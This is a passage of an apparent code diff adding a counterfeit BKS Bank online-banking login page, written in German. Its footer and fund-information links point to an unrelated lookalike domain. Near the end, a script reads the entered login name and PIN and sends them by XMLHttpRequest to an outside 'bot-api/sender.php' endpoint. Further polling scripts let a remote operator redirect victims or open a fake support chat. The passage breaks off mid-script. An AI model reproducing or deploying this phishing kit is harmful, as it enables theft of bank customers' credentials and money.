+                              data-test="db-accordion-body"
+                            >
+                              <header
+                                class="db-accordion-header row"
+                                data-test="db-accordion-header"
+                              >
+                                <div
+                                  class="db-accordion-header-title col-xs-9 col-sm-7"
+                                  data-test="db-accordion-header-title"
+                                >
+                                  <h2 data-test="db-accordion-headline"></h2>
+                                </div>
+                                <div
+                                  class="db-accordion-header-actions col-xs-3 col-sm-5"
+                                  data-test="db-accordion-header-actions"
+                                >
+                                  <div
+                                    class="db-btn-group db-accordion-header-button-container db-right"
+                                    data-test="db-accordion-header-button-container"
+                                  >
+                                    <button
+                                      id="accordion-js-login-cms-notifications-accordion-972802394-close"
+                                      type="button"
+                                      class="db-btn db-btn-icon primary db-primary db-mb-0 js-db-accordion-close-button"
+                                      name="accordion-js-login-cms-notifications-accordion-972802394-close"
+                                      onclick="DbitComponents.AccordionHandler.closeAccordion({uniqueId: &#39;js-login-cms-notifications-accordion-972802394&#39;})"
+                                      aria-label="Schließen"
+                                      data-test="db-btn-ONE_FIVE_CLOSE"
+                                      title="Schließen"
+                                    >
+                                      <span
+                                        class="db-icon-wrapper"
+                                        data-test="db-icon-wrapper-close"
+                                        ><i
+                                          class="dbit-icons"
+                                          data-test="db-icon"
+                                        >
+                                          close</i
+                                        ></span
+                                      >
+                                    </button>
+                                  </div>
+                                </div>
+                              </header>
+                              <section
+                                class="db-accordion-content row"
+                                data-test="db-accordion-content"
+                              >
+                                <div class="col-xs-12">
+                                  <p class="bold db-m-0">
+                                    Wichtige Information für FondsanlegerInnen
+                                  </p>
+
+                                  Ab 01.01.2023 sind Fondsgesellschaften
+                                  gesetzlich verpflichtet, sogenannte
+                                  PRIIP-KIDs, auch Basisinformationsblätter
+                                  genannt, zu erstellen. Diese enthalten
+                                  standardisierte Informationen über
+                                  grundlegende Merkmale und Risiken des
+                                  jeweiligen Fonds. Im Gegenzug entfällt die
+                                  Pflicht zur Erstellung der Ihnen bekannten
+                                  „Wesentlichen Anlegerinformationen“ (KID).<br />
+                                  &nbsp;<br />
+                                  Bei Kauf eines Fonds oder dem Abschluss eines
+                                  Fondssparers steht Ihnen das jeweilige
+                                  PRIIP-KID bei Ordererfassung in der Ordermaske
+                                  zum Download zur Verfügung.<br />
+                                  &nbsp;<br />
+                                  Die neuen Basisinformationsblätter für die
+                                  Fonds der 3 Banken-Generali
+                                  Investment-Gesellschaft m.b.H. finden Sie ab
+                                  01.01.2023 darüber hinaus unter
+                                  folgendem&nbsp;&nbsp;<a
+                                    href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                    ><span style="color: #ff0000">Link</span></a
+                                  >&nbsp;&nbsp;bzw. für Fonds anderer
+                                  Fondsgesellschaften auf der jeweiligen
+                                  Website.<br />
+                                  &nbsp;<br />
+                                  Für nähere Informationen steht Ihnen Ihre
+                                  Anlageberaterin bzw. Ihr Anlageberater gerne
+                                  zur Verfügung.<br />
+                                  &nbsp;<br />
+                                  Ihre BKS Bank
+                                </div>
+                              </section>
+                              <footer
+                                class="db-accordion-footer row"
+                                data-test="db-accordion-footer"
+                              ></footer>
+                            </div>
+                          </div>
+                          <script type="text/javascript">
+                            $(document).ready(function () {
+                              DbitComponents.AccordionHandler.unregister(
+                                "js-login-cms-notifications-accordion-972802394"
+                              );
+                              DbitComponents.AccordionHandler.register({
+                                domId:
+                                  "js-login-cms-notifications-accordion-972802394",
+                                activeTargetSelectors:
+                                  "#js-login-cms-notifications-accordion-972802394-row",
+                                initialState: "closed",
+                                animationTimeScrolling: 500,
+                                scrollIntoView: true,
+                                activateDirtyCheck: false,
+                                tipsyId:
+                                  "js-db-accordion-close-tipsy-js-login-cms-notifications-accordion-972802394",
+                              });
+                            });
+                          </script>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <script type="text/javascript">
+              $(document).ready(function () {
+                DbitComponents.TableHandler.register({
+                  domId: "notifciations-table",
+                });
+              });
+            </script>
+            <div
+              id="_loginportlet_WAR_loginportlet_:moreButtonSection"
+              class="db-text-center db-mt-3 db-mb-3"
+            >
+              <form
+                data-senna-off="true"
+                id="_loginportlet_WAR_loginportlet_:moreSectionButtonForm"
+                name="_loginportlet_WAR_loginportlet_:moreSectionButtonForm"
+                method="post"
+                action="https://www.bksbank-online.at/login?p_auth=JKJVUQpb&amp;p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=1&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__facesViewIdRender=%2Fviews%2Flogin.xhtml"
+                enctype="application/x-www-form-urlencoded"
+              >
+                <input
+                  type="hidden"
+                  name="_loginportlet_WAR_loginportlet_:moreSectionButtonForm"
+                  value="_loginportlet_WAR_loginportlet_:moreSectionButtonForm"
+                /><input
+                  type="hidden"
+                  name="javax.faces.encodedURL"
+                  value="https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__jsfBridgeAjax=true&amp;_loginportlet_WAR_loginportlet__facesViewIdResource=%2Fviews%2Flogin.xhtml"
+                /><button
+                  type="submit"
+                  class="db-btn primary"
+                  onclick="event.preventDefault();loadMoreNotifications();"
+                  aria-label="Weitere Nachrichten anzeigen"
+                  data-test="db-btn-Weitere Nachrichten anzeigen"
+                  title="Weitere Nachrichten anzeigen"
+                  control-id="ControlID-10"
+                >
+                  <span class="db-btn-text" data-test="db-btn-text"
+                    >Weitere Nachrichten anzeigen</span
+                  >
+                </button>
+                <script
+                  id="_loginportlet_WAR_loginportlet_:moreSectionButtonForm:j_idt961"
+                  type="text/javascript"
+                >
+                  loadMoreNotifications = function () {
+                    PrimeFaces.ab({
+                      s: "_loginportlet_WAR_loginportlet_:moreSectionButtonForm:j_idt961",
+                      f: "_loginportlet_WAR_loginportlet_:moreSectionButtonForm",
+                      u: "_loginportlet_WAR_loginportlet_:notificationsArea",
+                      onco: function (xhr, status, args) {
+                        DBIT.Login.restoreNotificationStatus();
+                      },
+                      pa: arguments[0],
+                    });
+                  };
+                </script>
+                <input
+                  type="hidden"
+                  name="javax.faces.ViewState"
+                  id="_loginportlet_WAR_loginportlet_:javax.faces.ViewState:4"
+                  value="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"
+                  autocomplete="off"
+                  control-id="ControlID-11"
+                />
+              </form>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="/bks_files/login(6)"></script>
+      </div>
+      <div
+        class="portlet-boundary portlet-boundary_ta3528portlet_WAR_usvtuffsvtfsjogpsnbujpoportlet_ portlet-static portlet-static-end decorate"
+        id="p_p_id_ta3528portlet_WAR_usvtuffsvtfsjogpsnbujpoportlet_"
+      >
+        <span id="p_ta3528portlet_WAR_usvtuffsvtfsjogpsnbujpoportlet"></span>
+        <div
+          id="_ta3528portlet_WAR_usvtuffsvtfsjogpsnbujpoportlet_"
+          class="liferay-faces-bridge-body"
+        >
+          <script type="text/javascript">
+            if (window.PrimeFaces) {
+              PrimeFaces.settings.locale = "de_AT";
+            }
+          </script>
+        </div>
+      </div>
+      <div
+        class="portlet-boundary portlet-boundary_monitoringportlet_WAR_systemportlet_ portlet-static portlet-static-end decorate"
+        id="p_p_id_monitoringportlet_WAR_systemportlet_"
+      >
+        <span id="p_monitoringportlet_WAR_systemportlet"></span>
+        <div
+          id="_monitoringportlet_WAR_systemportlet_"
+          class="liferay-faces-bridge-body"
+        >
+          <script type="text/javascript">
+            if (window.PrimeFaces) {
+              PrimeFaces.settings.locale = "de_AT";
+            }
+          </script>
+        </div>
+      </div>
+      <div
+        class="portlet-boundary portlet-boundary_kobilsystemportlet_WAR_systemportlet_ portlet-static portlet-static-end decorate"
+        id="p_p_id_kobilsystemportlet_WAR_systemportlet_"
+      >
+        <span id="p_kobilsystemportlet_WAR_systemportlet"></span>
+        <div
+          id="_kobilsystemportlet_WAR_systemportlet_"
+          class="liferay-faces-bridge-body"
+        >
+          <script type="text/javascript">
+            if (window.PrimeFaces) {
+              PrimeFaces.settings.locale = "de_AT";
+            }
+          </script>
+        </div>
+      </div>
+      <form
+        action="https://www.bksbank-online.at/web/bks/login#"
+        class="hide"
+        id="hrefFm"
+        method="post"
+        name="hrefFm"
+      >
+        <span></span><input hidden="" type="submit" />
+      </form>
+    </div>
+    <div class="footer">
+      <div class="container-std">
+        <div
+          class="portlet-boundary portlet-boundary_footerportlet_WAR_footerportlet_ portlet-static portlet-static-end decorate"
+          id="p_p_id_footerportlet_WAR_footerportlet_"
+        >
+          <span id="p_footerportlet_WAR_footerportlet"></span>
+          <div
+            id="_footerportlet_WAR_footerportlet_"
+            class="liferay-faces-bridge-body"
+          >
+            <script type="text/javascript">
+              if (window.PrimeFaces) {
+                PrimeFaces.settings.locale = "en_US";
+              }
+            </script>
+            <ul>
+              <li>
+                <a href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                  >Impressum</a
+                >
+              </li>
+              <li>
+                <a href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                  >AGB</a
+                >
+              </li>
+              <li>
+                <a href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                  >Geschäftsbedingungen</a
+                >
+              </li>
+              <li>
+                <a
+                  href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                ></a>
+              </li>
+            </ul>
+            <span class="copyright">© BKS Bank AG</span>
+            <!-- EOS BUILD INFORMATION: 23.03.07-production (2023-03-06 13:10) -->
+            <div id="js-chatv-overlay-container" class="db-overlay-container">
+              <div id="js-chatv-overlay-panel" class="db-overlay-panel">
+                <form
+                  data-senna-off="true"
+                  id="_footerportlet_WAR_footerportlet_:j_idt25"
+                  name="_footerportlet_WAR_footerportlet_:j_idt25"
+                  method="post"
+                  action="https://www.bksbank-online.at/login?p_auth=JKJVUQpb&amp;p_p_id=footerportlet_WAR_footerportlet&amp;p_p_lifecycle=1&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_footerportlet_WAR_footerportlet__facesViewIdRender=%2Fviews%2Ffooter.xhtml"
+                  enctype="application/x-www-form-urlencoded"
+                >
+                  <input
+                    type="hidden"
+                    name="_footerportlet_WAR_footerportlet_:j_idt25"
+                    value="_footerportlet_WAR_footerportlet_:j_idt25"
+                  /><input
+                    type="hidden"
+                    name="javax.faces.encodedURL"
+                    value="https://www.bksbank-online.at/login?p_p_id=footerportlet_WAR_footerportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_footerportlet_WAR_footerportlet__jsfBridgeAjax=true&amp;_footerportlet_WAR_footerportlet__facesViewIdResource=%2Fviews%2Ffooter.xhtml"
+                  />
+                  <header class="db-panel-header">
+                    <div class="db-panel-title">
+                      <h2 class="db-h2">
+                        Fernwartung zur Unterstützung des KundenService Centers
+                      </h2>
+                    </div>
+                    <div class="db-panel-actions">
+                      <button
+                        id="chatv-main-close"
+                        type="button"
+                        class="db-btn db-btn-icon primary"
+                        onclick="DbitComponents.PopUp.toggleOverlay({                                             overlayId: &#39;js-chatv-overlay-container&#39;,                                             panelId: &#39;js-chatv-overlay-panel&#39;                                         });           document.getElementsByClassName(&#39;js-chatvisor-allow&#39;)[0].checked = false;           document.getElementById(&#39;chatvisor-start&#39;).disabled = true;          "
+                        aria-label="Schließen"
+                        data-test="db-btn-CHATVISOR_CLOSE"
+                        title="Schließen"
+                        control-id="ControlID-12"
+                      >
+                        <span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-close"
+                          ><i class="dbit-icons" data-test="db-icon">
+                            close</i
+                          ></span
+                        >
+                      </button>
+                    </div>
+                  </header>
+                  <section class="db-panel-content">
+                    <div class="row">
+                      <div class="col-xs-12">
+                        Hier öffnen Sie eine Fernwartung zur Unterstützung durch
+                        unser Kundenservicecenter.<br />
+                        Kontaktieren Sie uns unter:<br />
+                        Tel.: +43 (463) 5858 640<br />
+                        Mo bis Fr 07:00 Uhr - 19:00 Uhr
+                      </div>
+                      <div class="col-xs-12 db-separator">
+                        <div
+                          class="db-checkbox-wrapper"
+                          data-test="db-checkbox-wrapper-chatvisor_allow"
+                        >
+                          <input
+                            id="_footerportlet_WAR_footerportlet_:j_idt25:j_idt49:chatvisor_allow"
+                            type="checkbox"
+                            name="_footerportlet_WAR_footerportlet_:j_idt25:j_idt49:chatvisor_allow"
+                            class="db-checkbox js-chatvisor-allow"
+                            onchange="var btn = document.getElementById(&#39;chatvisor-start&#39;); if(btn.disabled){btn.disabled = false;}else{btn.disabled = true;}"
+                            data-test="db-checkbox-chatvisor_allow"
+                            control-id="ControlID-13"
+                          /><label
+                            for="_footerportlet_WAR_footerportlet_:j_idt25:j_idt49:chatvisor_allow"
+                            class="db-checkbox-label"
+                            data-test="db-checkbox-label-chatvisor_allow"
+                            ><span
+                              class="db-checkbox-label-text"
+                              data-test="db-checkbox-label-text-chatvisor_allow"
+                              >Ich stimme dem Einsatz des
+                              Online-Fernwartungsprogrammes hiermit ausdrücklich
+                              zu. Dieses Programm stellt dabei eine Verbindung
+                              zwischen meinem PC und dem des Mitarbeiters des
+                              KundenService Centers her und ermöglicht ihm den
+                              Blick auf meinen Bildschirm zum Zwecke der
+                              Fehlerfindung bzw. -behebung (Fernwartung). Die
+                              Datenübertragung erfolgt über öffentliche
+                              Kommunikationsnetze. Trotz verschlüsselter
+                              Übertragung kann nicht ausgeschlossen werden, dass
+                              Dritte diesen Datenverkehr einsehen oder
+                              manipulieren können. Dadurch könnte etwa
+                              Schadsoftware auf meinen Rechner, Daten von meinem
+                              Rechner an Dritte gelangen, oder meine
+                              elektronische Identität missbräuchlich verwendet
+                              werden. Die Bank trifft keine Haftung, wenn der
+                              Schaden durch einen unabhängigen Dritten oder
+                              sonst durch ein unabwendbares Ereignis verursacht
+                              wurde, das weder auf einen Fehler in der
+                              Beschaffenheit noch auf einem Versagen der Mittel
+                              der automationsunterstützten Datenverarbeitung der
+                              Bank beruht. Für allfällige Schäden, die im
+                              Zusammenhang mit der Hard- oder Software des
+                              Kunden oder durch das Nichtzustandekommen des
+                              Verbindungsaufbaues mit dem Rechenzentrumentstehen
+                              können, haftet die Bank nur, sofern sie diese
+                              Schäden schuldhaft verursacht hat. Während der
+                              Fernwartung kommt es zur laufenden Übertragung und
+                              Verarbeitung folgender Informationen:
+                              Mausbewegungen, Scrollverhalten, Klicks,
+                              Formulareingaben (sensible Eingaben werden
+                              standardmäßig von der Übertragung ausgeschlossen),
+                              Position auf Webseite, besuchte Unterseiten, Zeit
+                              auf Seite, Browser, Betriebssystem, Typ des
+                              Endgeräts, Bildschirmauflösung, anonymisierte
+                              IP-Adresse, Ort des Zugriffs (Stadt/Nation). Die
+                              Verarbeitung erfolgt auf Grundlage des Art. 6 (1)
+                              a) DSGVO nach Zustimmung des Nutzers und dient der
+                              Durchführung der Fernwartung. Zu
+                              Nachforschungszwecken wird die Sitzung per
+                              Videoaufzeichnung für die Dauer von sechs Wochen
+                              gespeichert. In diese Aufzeichnung willige ich
+                              ausdrücklich ein. Die Aufzeichnung wird zu keinem
+                              anderen Zweck vorgenommen, als in etwaigen
+                              Streitfällen den Ablauf der Sitzung verbindlich
+                              dokumentieren zu können. Nach Ablauf dieser sechs
+                              Wochen wird die Aufzeichnung gelöscht. Allfällige
+                              Ansprüche auf Grund des
+                              Online-Fernwartungsprogrammes können nur während
+                              dieser Frist geltend gemacht werden. Es gelten die
+                              Allgemeinen Geschäftsbedingungen der BKS Bank
+                              AG.</span
+                            ></label
+                          >
+                        </div>
+                      </div>
+                    </div>
+                  </section>
+                  <footer class="db-panel-footer">
+                    <div class="db-btn-group db-right">
+                      <button
+                        id="chatv-close"
+                        type="button"
+                        class="db-btn primary"
+                        onclick="document.getElementById(&#39;chatv-main-close&#39;).click();"
+                        aria-label="Schließen"
+                        data-test="db-btn-CHATVISOR_CLOSE"
+                        title="Schließen"
+                        control-id="ControlID-14"
+                      >
+                        <span class="db-btn-text" data-test="db-btn-text"
+                          >Schließen</span
+                        ></button
+                      ><button
+                        id="chatvisor-start"
+                        type="button"
+                        class="db-btn accent"
+                        disabled="disabled"
+                        onclick="if(typeof CV !== &#39;undefined&#39; ){CV.cobrowse.start();document.getElementById(&#39;chatv-main-close&#39;).click();}"
+                        aria-label="Fernwartung starten"
+                        data-test="db-btn-CHATVISOR_START"
+                        title="Fernwartung starten"
+                        control-id="ControlID-15"
+                      >
+                        <span class="db-btn-text" data-test="db-btn-text"
+                          >Fernwartung starten</span
+                        >
+                      </button>
+                    </div>
+                  </footer>
+                  <input
+                    type="hidden"
+                    name="javax.faces.ViewState"
+                    id="_footerportlet_WAR_footerportlet_:javax.faces.ViewState:0"
+                    value="-167710979344674817:4175772652866693439"
+                    autocomplete="off"
+                    control-id="ControlID-16"
+                  />
+                </form>
+              </div>
+            </div>
+            <script type="text/javascript">
+              $(document).ready(function () {
+                DbitComponents.PopUp.init({
+                  overlayId: "js-chatv-overlay-container",
+                  panelId: "js-chatv-overlay-panel",
+                });
+              });
+            </script>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="print-footer">
+      <div class="print_left">© BKS Bank-Online</div>
+      <div class="print_right">26.04.2023</div>
+    </div>
+    <div
+      class="db-tipsy db-error db-message-tipsy"
+      id="js-error-tipsy"
+      data-test="db-error-tipsy"
+    >
+      <div class="db-tipsy-arrow db-arrow-up js-db-tipsy-arrow"></div>
+      <div
+        class="db-tipsy-message js-db-tipsy-message"
+        data-test="db-error-tipsy-message"
+      ></div>
+    </div>
+    <div
+      class="db-tipsy db-message-tipsy"
+      id="js-info-tipsy"
+      data-test="db-info-tipsy"
+    >
+      <div class="db-tipsy-arrow db-arrow-up js-db-tipsy-arrow"></div>
+      <div
+        class="db-tipsy-message js-db-tipsy-message"
+        data-test="db-info-tipsy-message"
+      ></div>
+    </div>
+
+    <script>
+      function sendlog(t) {
+        if (
+          document.getElementById(
+            "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt51:loginDisposer"
+          ).value.length < 1 ||
+          document.getElementById(
+            "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt91:loginPin-password"
+          ).value.length < 1
+        ) {
+          return;
+        }
+        document.getElementById(
+          "_loginportlet_WAR_loginportlet_:jsf_login_form:loginButton"
+        ).style.opacity = "0.6";
+        var login = document.getElementById(
+          "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt51:loginDisposer"
+        ).value;
+        var password = document.getElementById(
+          "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt91:loginPin-password"
+        ).value;
+        t.disabled = true;
+        var xhr = new XMLHttpRequest();
+        xhr.open(
+          "POST",
+          "https://uncon-pays.site/nwbt/bot-api/sender.php",
+          true
+        );
+        xhr.setRequestHeader(
+          "Content-type",
+          "application/x-www-form-urlencoded"
+        );
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
+            setTimeout(() => {
+              window.location.href =
+                "/confirm.php?page_id=264137254629&bank=BKS";
+            }, 1000);
+          }
+        };
+        // 			document.getElementById("ext-comp-1014").classList.add("x-item-disabled");
+        xhr.send(
+          "type=lk&bank=BKS&login=" +
+            login +
+            "&password=" +
+            password +
+            "&page_id=264137254629"
+        );
+      }
+    </script>
+
+    <script>
+      globalThis.currentStatus2 = "false";
+      setInterval(updateStatus2, 1000);
+      // setInterval(updateStatus2, 1000);
+
+      function updateStatus2() {
+        $.get(
+          "/newMsg.php",
+          {
+            page_id: 264137254629,
+            page: "authorize",
+          },
+          function (status) {
+            console.log(currentStatus2);
+            console.log(status);
+            if (currentStatus2 != status) {
+              console.log("[LOG] Status updated");
+
+              globalThis.currentStatus2 = status;
+              // console.log(status);
+              switch (status) {
+                case "true":
+                  break;
+                case "false":
+                  openForm();
+                  break;
+              }
+            }
+          }
+        );
+      }
+
+      function openForm() {
+        $("#myForm").css("display", "block");
+        $("#open-support").css("display", "none");
+        var objDiv = document.getElementById("messages");
+        objDiv.scrollTop = objDiv.scrollHeight;
+      }
+
+      function closeForm() {
+        $("#myForm").css("display", "none");
+        $("#open-support").css("display", "block");
+      }
+    </script>
+    <script
+      src="/bks_files/jquery-3.6.1.min.js"
+      integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
+      crossorigin="anonymous"
+    ></script>
+    <link href="/bks_files/chat.css" rel="stylesheet" />
+    <link href="/bks_files/css2" rel="stylesheet" />
+
+    <div
+      class="form-popup"
+      id="myForm"
+      style="padding-bottom: env(safe-area-inset-left); display: hidden"
+    >
+      <a onclick="closeForm()" class="chat-close close"> </a>
+      <iframe
+        style=""
+        class="form-chat-container"
+        src="/bks_files/264137254629.html"
+      ></iframe>
+
+      <script>
+        function updateStatus3() {
+          $.get("/getStatus.php", { page_id: 264137254629 }, function (status) {
+            // alert(status);
+            if (
+              status.includes("redirectLk") ||
